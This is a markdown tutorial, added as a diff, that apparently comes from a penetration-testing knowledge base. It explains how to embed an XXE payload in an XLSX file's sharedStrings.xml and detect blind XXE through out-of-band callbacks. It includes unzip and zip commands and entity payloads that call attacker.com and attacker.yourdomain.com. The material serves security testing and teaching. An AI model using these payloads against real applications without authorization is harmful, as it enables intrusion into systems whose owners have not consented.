@@ -1,0 +1,90 @@
+---
+title: Exploiting XXE Vulnerabilities in XLSX Files
+description: Learn how to exploit XML External Entity (XXE) vulnerabilities in XLSX
+  files using embedded malicious XML payloads.
+keywords:
+- XXE vulnerability
+- XLSX files
+- XML External Entity
+- sharedStrings.xml
+- Office Open XML
+- blind XXE
+- spreadsheet security
+- malicious XML payload
+- XXE exploitation
+- Excel file parsing
+---
+
+# XXE Inside XLSX file
+
+## Context
+
+This guide aims to demonstrate the exploitation of XML External Entity (XXE) vulnerabilities within XLSX files. By embedding malicious payloads in the XML components of an Excel file, attackers can execute XXE attacks during the file parsing process. This document presumes knowledge of XML structures, the Office Open XML file format, and general Excel file structures, as well as familiarity with standard XXE exploitation techniques.
+
+## Theory
+
+### XLSX File Structure and XML Components
+
+XLSX files are essentially ZIP archives containing multiple XML files that represent spreadsheet data and metadata. Key components within an XLSX archive include `sharedStrings.xml`, `workbook.xml`, and the XML files for individual worksheets. These XML files are extracted and processed by Excel or server-side parsers during importation or data analysis.
+
+### XXE Attack Surface in XLSX Files
+
+The attack surface for XXE in XLSX files exists when XML parsers used to process these files do not disable the resolution of external entities. This vulnerability can be exploited by embedding a malicious XML payload, such as within `sharedStrings.xml`, repackaging the XLSX file, and submitting it to a target application. These applications often trust uploaded XLSX files and parse the embedded XML without proper validation.
+
+### Blind XXE in Excel Context
+
+Blind XXE occurs when the exfiltration of data or the impact of the attack is not directly observable through application responses. Detection of exploitation in such cases is achieved through out-of-band (OOB) channels, such as monitoring DNS or HTTP callbacks, to detect XXE exploitation activity.
+
+## Practice
+
+### Embedding XXE Payload in sharedStrings.xml
+
+- **Extract the XLSX Contents:**
+  ```bash
+  unzip target.xlsx -d xlsx_extracted
+  ```
+  This command extracts the contents of the XLSX file to a directory named `xlsx_extracted` for modification.
+
+- **Edit sharedStrings.xml:**
+  Open `xlsx_extracted/xl/sharedStrings.xml` in a text editor of your choice.
+
+- **Inject XXE Payload:**
+  Replace or inject the following payload into `sharedStrings.xml`:
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe"> ]>
+  <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <si><t>&xxe;</t></si>
+  </sst>
+  ```
+
+- **Repackage the XLSX File:**
+  ```bash
+  cd xlsx_extracted && zip -r ../xxe_payload.xlsx *
+  ```
+  This command navigates to the extracted directory and repackages the files into a new XLSX file named `xxe_payload.xlsx`.
+
+- **Submit the Malicious XLSX:**
+  Upload or submit `xxe_payload.xlsx` to the target application. If the application is vulnerable, the system will make an outbound request, confirming XXE exploitation.
+
+### Detecting Blind XXE via OOB DNS Callback
+
+- **Use a Callback Payload:**
+  Modify the payload to interact with a domain you control for out-of-band detection:
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.yourdomain.com/"> ]>
+  <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <si><t>&xxe;</t></si>
+  </sst>
+  ```
+
+- **Monitor for OOB Activities:**
+  Keep an eye on your DNS or HTTP logs to capture requests from the target environment. These requests indicate successful XXE exploitation, with the environment trying to resolve or access your controlled domain.
+
+## Tools
+
+- **zip/unzip**
+- **Burp Collaborator**
+- **Responder**
+- **dig**
